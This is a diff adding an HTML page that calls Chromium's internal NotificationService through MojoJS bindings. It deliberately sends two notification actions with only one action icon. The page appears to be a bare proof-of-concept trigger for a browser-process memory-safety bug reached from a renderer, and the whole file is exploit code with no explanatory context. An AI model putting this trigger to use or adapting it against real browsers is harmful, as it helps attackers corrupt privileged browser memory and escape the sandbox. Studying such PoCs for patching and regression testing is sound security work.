@@ -1,0 +1,58 @@
+<html>
+  <head>
+    <script src="mojo/mojo_bindings.js"></script>
+    <script src="mojo/third_party/blink/public/mojom/notifications/notification_service.mojom.js"></script>
+    <script>
+        function NonPersistentNotificationListenerImpl(){};
+        var service=new blink.mojom.NotificationServicePtr();
+        Mojo.bindInterface(blink.mojom.NotificationService.name,mojo.makeRequest(service).handle,"context");
+        var token="aaa";
+        var data=new blink.mojom.NotificationData();
+        var title = new mojoBase.mojom.String16();
+        title.data = 'aa'.split('');
+        data.title=title;
+        data.body=new mojoBase.mojom.String16();
+        data.body.data = 'aa'.split('');
+        data.tag="tag";
+        var url=new url.mojom.Url({url:window.location.href});
+        data.image=url;
+        data.icon=url;
+        data.badge=url;
+        data.vibration_pattern=[];
+        data.data=[];
+        data.actions=[];
+        
+        for(i=0;i<2;i++)
+        {
+        action=new blink.mojom.NotificationAction();
+        action.type=blink.mojom.NotificationActionType.TEXT;
+        action.action="action"+i;
+        action.title = title;
+        action.icon=url;
+        data.actions[i]=action;
+        }
+        
+        var resources=new blink.mojom.NotificationResources();
+
+        icon=new skia.mojom.BitmapN32();
+        icon.imageInfo=new skia.mojom.BitmapN32ImageInfo({alphaType:skia.mojom.AlphaType.ALPHA_TYPE_OPAQUE,width:0,height:0});
+        icon.pixelData=new mojoBase.mojom.BigBuffer();
+        icon.pixelData.bytes=[0];
+        resources.actionIcons=[icon];
+
+        var listenerPtr=new blink.mojom.NonPersistentNotificationListenerPtr();
+        var binding = new mojo.Binding(blink.mojom.NonPersistentNotificationListener,new NonPersistentNotificationListenerImpl(),mojo.makeRequest(listenerPtr));
+
+        Notification.requestPermission(function (permission) {
+            if (Notification.permission == "granted") {
+            //alert("trigger")
+            service.displayNonPersistentNotification(token,data,resources,listenerPtr);
+            //location.reload();
+            }
+        });
+
+    </script>
+  </head>
+  <body>
+  </body>
+</html>
